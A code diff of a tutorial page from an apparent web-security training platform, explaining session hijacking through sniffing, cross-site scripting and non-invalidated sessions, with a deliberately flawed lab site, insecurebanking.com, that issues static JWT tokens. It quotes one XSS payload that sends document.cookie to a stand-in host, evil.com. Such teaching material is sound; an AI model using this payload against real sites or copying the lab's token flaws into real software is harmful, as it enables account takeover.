@@ -11,7 +11,7 @@
         integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
 
     <link rel="stylesheet" href="../user-portal/common.css">
-    <link rel="stylesheet" href="session_hijacking.css">
+    <link rel="stylesheet" href="common.css">
 
     <title>Web-Vulnerability Platform</title>
 </head>
@@ -100,30 +100,55 @@
                 traffic on a public network, or force the victim to connect to an access point controlled by the
                 attacker in a so-called Man-in-the-Middle (MitM) attack. By monitoring traffic of the victim, the
                 attacker can intercept session cookies when they are set by the web server, obtaining the
-                session ID.
+                session ID. This attack is illustrated in <i>Figure 1</i>, below.
             </p>
+
+            <div class="image-container">
+                <figure>
+                    <img src="../images/session-hijacking-packet-sniffing.svg"
+                        alt="Session hijacking using traffic monitoring">
+                    <figcaption>Figure 1: Session hijacking using traffic monitoring</figcaption>
+                </figure>
+            </div>
+
             <p>
                 The attacker can also use a <a href="/pages/xss.html">cross-site scripting (XSS)</a> attack, as
-                discussed
-                previously, to execute javascript code that sends the victim's cookies to the attacker. An example
-                payload that does exactly this is as follows:
+                discussed previously, to execute javascript code that sends the victim's cookies to the attacker. An
+                example payload that does exactly this is as follows:
             </p>
             <pre class="prettyprint">
 &ltscript&gtnew Image().src = "http://evil.com/steal-cookies?cookies=" + document.cookie;&lt/script&gt
 </pre>
             <p>
                 This code will add a HTML <code>&ltimg&gt</code> element to the DOM. When this image is loaded a request
-                to the source URL is send, compromising the victim's cookies.
+                to the source URL is send, compromising the victim's cookies. After obtaining the victim's cookies, the
+                attacker can hijack the session by setting the cookies in their own browser - tricking the server into
+                wrongfully authorizing the attacker. In <i>Figure 2</i> and <i>Figure 3</i>, example flows of session
+                hijacking attacks using both reflected, and stored cross site scripting vulnerabilities are shown.
             </p>
+
+            <div class="image-container">
+                <figure>
+                    <img src="../images/session-hijacking-reflected-XSS.svg"
+                        alt="Session hijacking using reflected XSS">
+                    <figcaption>Figure 2: Session hijacking using reflected XSS</figcaption>
+                </figure>
+
+                <figure>
+                    <img src="../images/session-hijacking-stored-XSS.svg" alt="Session hijacking using stored XSS">
+                    <figcaption>Figure 3: Session hijacking using stored XSS</figcaption>
+                </figure>
+            </div>
+
             <p>
-                A final pitfall (one that we will be exploiting in the example) is not destroying the user session on
-                the server side. When a user clicks on the sign out button, or when the cookie expires, the application
-                is
-                supposed to destroy all the session variables that are handled on the server side - invalidating the
-                session ID/token. If the developers just delete the cookies on the client side, the session on the
-                server is active indefinitely. This means that when an attacker obtains the session ID, they can still
-                access the application even though the user is no longer logged in! This way session hijacking attacks
-                can be performed at any time, not just when the user session is active.
+                A final pitfall that simplifies session hijacking attacks (one that we will be exploiting in the
+                example) is not destroying the user session on the server side. When a user clicks on the sign out
+                button, or when the cookie expires, the application is supposed to destroy all the session variables
+                that are handled on the server side - invalidating the session ID/token. If the developers just delete
+                the cookies on the client side, the session on the server is active indefinitely. This means that when
+                an attacker obtains the session ID, they can still access the application even though the user is no
+                longer logged in! This way session hijacking attacks can be performed at any time, not just when the
+                user session is active.
             </p>
             <hr>
             <h3>Consequences</h3>
@@ -168,17 +193,33 @@
                     <i>insecurebanking.com</i></strong>.
                 Their credentials can be found in the table on the right. After you have authenticated, a unique
                 (session) token is stored in the browser. This token is stored in a cookie, and is attached to each
-                request made to the
-                domain of <i>insecurebanking.com</i>. The backend of the web application then uses this token to make
-                sure that you are the person using the web application.
+                request made to the domain of <i>insecurebanking.com</i>. The back-end of the web application then uses
+                this token to determine what user is interacting with the web application, i.e. authentication.
             </p>
+
+            <aside>
+                <p>
+                    For the session ID the back-end uses a <a href="https://en.wikipedia.org/wiki/JSON_Web_Token">JSON
+                        Web Token (JWT)</a>. This is an internet standard used to represent claims to be transferred
+                    between two parties - in our case the authenticated user and <i>insecurebanking.com</i>. In the case
+                    of insecurebanking.com, the server signs the ID of the user using a private key. This
+                    enables the server to verify the legitimacy of the token, as well as retrieve the user ID when a
+                    request that includes a "token"-cookie is made. <br>
+                    There are multiple problems with the way tokens are generated by insecurebanking.com. One such
+                    problem is that only the user ID is signed. Because of this, the generated token remains static for
+                    each user. Ideally a nonce (number used once) would be added to the user ID such that the generated
+                    token is unique each time. Furthermore, as alluded to before, the token is not immediately
+                    invalidated when the user signs out. The token expires 1 hour after its creation, but due to the
+                    mentioned flaw in the token generation the same token can still be used.
+                </p>
+            </aside>
 
             <div class="login-container">
                 <div class="box" id="login-form">
                     <div class="alert alert-primary inner-box">
                         <h4 class="box-head">Logging In</h4>
                         <form id="form-signin">
-                            <input name="id" type="text" id="signinId" class="form-control" placeholder="User ID"
+                            <input name="id" type="number" id="signinId" class="form-control" placeholder="User ID"
                                 required="">
                             <input name="password" type="password" id="signinPassword" class="form-control"
                                 placeholder="Password" required="">
